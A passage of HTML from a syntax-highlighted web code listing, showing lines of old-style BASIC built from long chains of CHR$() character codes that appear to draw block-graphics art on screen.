punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">177</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">158</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span 